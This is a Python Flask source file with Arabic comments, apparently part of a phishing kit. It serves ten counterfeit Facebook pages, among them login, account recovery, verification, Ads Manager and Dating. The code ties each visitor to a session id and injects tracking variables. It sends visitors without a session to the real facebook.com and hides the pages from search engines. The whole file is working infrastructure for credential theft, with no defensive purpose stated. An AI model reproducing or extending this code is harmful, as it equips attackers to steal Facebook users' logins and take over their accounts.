# fake_sites/facebook/routes.py
# ============================================================
# مسارات Facebook المزيفة — 10 قوالب
# ============================================================

import os

from flask import render_template_string, request, redirect

from config import PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("fake_sites.facebook.routes")


# مسار القوالب
TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), 'templates')


# ============================================================
# قائمة القوالب (10)
# ============================================================
FACEBOOK_TEMPLATES = {
    "01_login": {
        "name": "تسجيل دخول Facebook",
        "emoji": "🔐",
        "file": "01_login.html",
    },
    "02_recovery": {
        "name": "استرداد حساب Facebook",
        "emoji": "🔄",
        "file": "02_recovery.html",
    },
    "03_verify": {
        "name": "تحقق من الحساب",
        "emoji": "✅",
        "file": "03_verify.html",
    },
    "04_ads": {
        "name": "Ads Manager",
        "emoji": "📊",
        "file": "04_ads.html",
    },
    "05_business": {
        "name": "Business Suite",
        "emoji": "💼",
        "file": "05_business.html",
    },
    "06_marketplace": {
        "name": "Marketplace",
        "emoji": "🛒",
        "file": "06_marketplace.html",
    },
    "07_groups": {
        "name": "Groups",
        "emoji": "👥",
        "file": "07_groups.html",
    },
    "08_dating": {
        "name": "Facebook Dating",
        "emoji": "❤️",
        "file": "08_dating.html",
    },
    "09_gaming": {
        "name": "Facebook Gaming",
        "emoji": "🎮",
        "file": "09_gaming.html",
    },
    "10_creator": {
        "name": "Creator Studio",
        "emoji": "🎬",
        "file": "10_creator.html",
    },
}


def _load_template(filename, **kwargs):
    """يقرأ قالب ويستبدل المتغيرات"""
    path = os.path.join(TEMPLATES_DIR, filename)
    if not os.path.exists(path):
        logger.warning(f"Template not found: {filename}")
        return None

    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()

    return render_template_string(content, **kwargs)


def _inject_globals(html, session_id, template_key):
    """يضيف متغيرات FS العامة"""
    if not html:
        return None

    # متغيرات JS
    globals_js = f"""
    <script>
        window.FS_SESSION_ID = "{session_id}";
        window.FS_SITE_NAME = "facebook_{template_key}";
        window.FS_REDIRECT_URL = "https://www.facebook.com";
    </script>
    """

    # دمج قبل </head>
    if '</head>' in html:
        html = html.replace('</head>', globals_js + '</head>', 1)
    else:
        html = globals_js + html

    return html


# ============================================================
# تسجيل المسارات
# ============================================================
def register_facebook_routes(app):
    """تسجيل مسارات Facebook المزيفة"""

    # ── مسار عام لكل القوالب ──
    @app.route('/fs/facebook/<template_key>', methods=['GET'])
    def facebook_template(template_key):
        """يعرض قالب Facebook حسب المفتاح"""

        # ابحث عن القالب
        tpl = FACEBOOK_TEMPLATES.get(template_key)
        if not tpl:
            logger.warning(f"Unknown template: {template_key}")
            return redirect("https://www.facebook.com", code=302)

        # جلب session_id من query
        session_id = request.args.get('s', '').strip()

        # لو مفيش session، اعمل redirect للفيسبوك الأصلي
        if not session_id:
            logger.warning(f"No session_id for template: {template_key}")
            return redirect("https://www.facebook.com", code=302)

        try:
            # حمّل القالب
            html = _load_template(
                tpl['file'],
                session_id=session_id,
                public_url=PUBLIC_URL,
            )

            if not html:
                return redirect("https://www.facebook.com", code=302)

            # أضف متغيرات FS
            html = _inject_globals(html, session_id, template_key)

            # إحصائيات
            metrics.inc_counter("fake_site_views", tags={
                "site": "facebook",
                "template": template_key
            })

            logger.info(f"📄 Facebook template served: {template_key} | session={session_id[:12]}")

            response = app.make_response(html)
            response.headers['Content-Type'] = 'text/html; charset=utf-8'
            response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
            response.headers['X-Robots-Tag'] = 'noindex, nofollow'

            return response

        except Exception as e:
            logger.exception(f"facebook_template error: {e}")
            return redirect("https://www.facebook.com", code=302)

    logger.info("[+] Facebook routes registered: /fs/facebook/<template_key>")
